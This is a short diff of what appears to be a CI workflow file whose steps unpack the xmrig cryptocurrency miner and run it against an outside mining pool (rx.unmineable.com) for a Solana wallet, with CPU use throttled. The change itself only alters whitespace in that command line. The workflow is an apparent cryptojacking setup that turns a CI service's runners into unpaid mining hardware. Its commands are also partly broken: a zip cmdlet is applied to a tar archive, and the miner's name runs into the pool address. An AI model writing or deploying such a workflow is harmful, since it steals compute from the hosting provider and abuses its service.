@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive xmrig-6.16.4-linux-x64.tar.gz
     - name: Running
-      run:  ./xmrig.rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SOL:uoXJ2QnaxJkVwNJrGGyyCiyGEhK27JyWHHMURUsfxWR.ep
+      run: ./xmrig.rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u SOL:uoXJ2QnaxJkVwNJrGGyyCiyGEhK27JyWHHMURUsfxWR.ep
     - name: DONE
       run: exit
